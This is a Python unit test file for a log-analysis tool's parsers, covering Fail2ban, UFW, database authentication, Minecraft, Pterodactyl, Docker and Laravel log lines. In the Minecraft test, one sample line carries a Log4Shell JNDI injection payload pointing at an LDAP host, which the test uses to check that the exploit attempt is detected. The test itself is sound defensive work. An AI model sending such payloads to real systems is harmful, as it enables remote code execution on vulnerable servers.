"""Unit tests for ecosystem parsers (Fail2ban, UFW, DatabaseAuth, Minecraft, Pterodactyl, Docker)."""

from datetime import UTC, datetime

from loglens.parsers import (
    DatabaseAuthParser,
    DockerJsonParser,
    Fail2banParser,
    LaravelParser,
    MinecraftParser,
    PterodactylParser,
    UfwParser,
)


def test_fail2ban_parser() -> None:
    parser = Fail2banParser()
    sample = [
        "2026-11-09 12:00:00,123 fail2ban.actions [1234]: NOTICE [sshd] Ban 198.51.100.22",
        "2026-11-09 12:05:00,456 fail2ban.actions [1234]: NOTICE [sshd] Unban 198.51.100.22",
    ]
    assert parser.matches_sample(sample) > 0.5

    # Parse Ban event
    ev_ban = parser.parse_line(sample[0], 1)
    assert ev_ban is not None
    assert ev_ban.source == "fail2ban"
    assert ev_ban.severity_hint == "warning"
    assert ev_ban.fields["jail"] == "sshd"
    assert ev_ban.fields["action"] == "ban"
    assert ev_ban.fields["client_ip"] == "198.51.100.22"

    # Parse Unban event
    ev_unban = parser.parse_line(sample[1], 2)
    assert ev_unban is not None
    assert ev_unban.severity_hint == "info"
    assert ev_unban.fields["action"] == "unban"


def test_ufw_parser() -> None:
    parser = UfwParser()
    sample = [
        "Nov 09 12:00:00 gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:08:00 "
        "SRC=192.0.2.100 DST=192.0.2.1 LEN=40 TOS=0x00 PREC=0x00 TTL=240 ID=54321 PROTO=TCP SPT=51234 DPT=445 WINDOW=1024",
    ]
    assert parser.matches_sample(sample) > 0.5

    ev = parser.parse_line(sample[0], 1)
    assert ev is not None
    assert ev.source == "ufw"
    assert ev.severity_hint == "warning"
    assert ev.fields["action"] == "block"
    assert ev.fields["client_ip"] == "192.0.2.100"
    assert ev.fields["destination_ip"] == "192.0.2.1"
    assert ev.fields["protocol"] == "TCP"
    assert ev.fields["dpt"] == 445
    assert ev.fields["spt"] == 51234


def test_database_auth_parser_postgres() -> None:
    parser = DatabaseAuthParser()
    sample = [
        '2026-11-09 12:00:00 UTC [1234] postgres@app_db FATAL: password authentication failed for user "postgres"',
    ]
    assert parser.matches_sample(sample) > 0.5

    ev = parser.parse_line(sample[0], 1)
    assert ev is not None
    assert ev.source == "postgres"
    assert ev.severity_hint == "critical"
    assert ev.fields["user"] == "postgres"
    assert ev.fields["database"] == "app_db"
    assert ev.fields["database_system"] == "postgresql"


def test_database_auth_parser_mysql() -> None:
    parser = DatabaseAuthParser()
    sample = [
        "2026-11-09T12:00:00.123456Z 123 [Note] Access denied for user 'admin'@'198.51.100.22' (using password: YES)",
    ]
    assert parser.matches_sample(sample) > 0.5

    ev = parser.parse_line(sample[0], 1)
    assert ev is not None
    assert ev.source == "mysql"
    assert ev.severity_hint == "warning"
    assert ev.fields["user"] == "admin"
    assert ev.fields["client_ip"] == "198.51.100.22"
    assert ev.fields["database_system"] == "mysql"


def test_minecraft_parser() -> None:
    parser = MinecraftParser()
    ref = datetime(2026, 11, 9, 12, 0, 0, tzinfo=UTC)
    sample = [
        "[12:00:01] [Server thread/INFO]: Steve[/192.0.2.55:54321] logged in with entity id 123 at (100.5, 64.0, -200.5)",
        "[12:00:02] [Server thread/WARN]: [/198.51.100.66:42122] Failed RCON authentication",
        "[12:00:03] [Server thread/INFO]: <BadActor> ${jndi:ldap://198.51.100.99/a} hello",
    ]
    assert parser.matches_sample(sample) > 0.5

    # Player login
    ev_login = parser.parse_line(sample[0], 1, reference_dt=ref)
    assert ev_login is not None
    assert ev_login.source == "minecraft"
    assert ev_login.fields["player"] == "Steve"
    assert ev_login.fields["client_ip"] == "192.0.2.55"
    assert ev_login.fields["port"] == 54321

    # RCON failure
    ev_rcon = parser.parse_line(sample[1], 2, reference_dt=ref)
    assert ev_rcon is not None
    assert ev_rcon.fields["rcon_failure"] is True
    assert ev_rcon.fields["client_ip"] == "198.51.100.66"
    assert ev_rcon.severity_hint == "warning"

    # Log4Shell exploit
    ev_jndi = parser.parse_line(sample[2], 3, reference_dt=ref)
    assert ev_jndi is not None
    assert ev_jndi.severity_hint == "critical"
    assert ev_jndi.fields["exploit_attempt"] == "log4shell"


def test_pterodactyl_parser() -> None:
    parser = PterodactylParser()
    sample = [
        "2026-11-09T12:00:01.456Z WARN: [server-uuid] authentication failed for remote client 192.0.2.77: token expired",
    ]
    assert parser.matches_sample(sample) > 0.5

    ev = parser.parse_line(sample[0], 1)
    assert ev is not None
    assert ev.source == "pterodactyl"
    assert ev.severity_hint == "warning"
    assert ev.fields["client_ip"] == "192.0.2.77"
    assert ev.fields["auth_failure"] is True
    assert ev.fields["subsystem"] == "server-uuid"


def test_docker_json_parser() -> None:
    parser = DockerJsonParser()
    sample = [
        '{"log":"2026-11-09 12:00:00 [ERROR] Out of memory crash\\n","stream":"stderr","time":"2026-11-09T12:00:00.123456789Z"}',
    ]
    assert parser.matches_sample(sample) > 0.5

    ev = parser.parse_line(sample[0], 1)
    assert ev is not None
    assert ev.source == "docker"
    assert ev.severity_hint == "error"
    assert ev.fields["stream"] == "stderr"
    assert "Out of memory crash" in ev.message


def test_laravel_parser() -> None:
    parser = LaravelParser()
    sample = [
        "[2026-11-10 04:42:49] local.ERROR: SQLSTATE[HY000] [2002] Connection refused (Connection: mysql, Host: 127.0.0.1, Port: 3306)",
        "[2026-11-10 04:42:50] production.CRITICAL: Uncaught Exception: Fatal crash at line 42",
        "[2026-11-10 04:42:51] local.WARNING: Deprecated method called from 198.51.100.14",
    ]
    assert parser.matches_sample(sample) > 0.5

    # ERROR
    ev_err = parser.parse_line(sample[0], 1)
    assert ev_err is not None
    assert ev_err.source == "laravel"
    assert ev_err.severity_hint == "error"
    assert ev_err.fields["environment"] == "local"
    assert ev_err.fields["level"] == "error"
    assert ev_err.fields["ip"] == "127.0.0.1"

    # CRITICAL
    ev_crit = parser.parse_line(sample[1], 2)
    assert ev_crit is not None
    assert ev_crit.severity_hint == "critical"
    assert ev_crit.fields["environment"] == "production"

    # WARNING
    ev_warn = parser.parse_line(sample[2], 3)
    assert ev_warn is not None
    assert ev_warn.severity_hint == "warning"
    assert ev_warn.fields["ip"] == "198.51.100.14"

    # Stacktrace continuation line
    ev_trace = parser.parse_line("#0 /var/www/html/app/Http/Controllers/UserController.php(42)", 4)
    assert ev_trace is not None
    assert ev_trace.fields["stacktrace"] is True
